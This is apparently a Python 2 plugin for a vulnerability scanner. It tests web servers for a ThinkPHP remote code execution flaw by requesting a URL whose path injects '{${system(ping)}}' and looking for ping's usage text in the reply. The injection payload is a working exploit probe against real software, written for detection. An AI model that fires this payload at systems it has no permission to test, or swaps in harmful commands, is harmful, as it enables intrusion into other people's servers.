#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        result = []
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        inj_path = 'index.php/module/action/param1/{${system(ping)}}'
        new_url = "%s://%s/%s" % (scheme,domain,inj_path)
        print new_url
        res, content = http.request(new_url, 'GET', headers=header)

        if re.search(r'ping.*\[-(c|n) count\].*\[-i', content, re.M|re.I):
            response = getResponse(res, content)
            request = getRequest(new_url, domain=ob['domain'])
            detail = "存在Thinkphp框架任意代码执行漏洞"
            result.append(getRecord(ob,new_url,ob['level'],detail,request,response))
            return result
    except Exception,e:
        logger.error("File:ThinkPHPExecScript_yd.py, run_domain function :%s" % (str(e)))
        return []





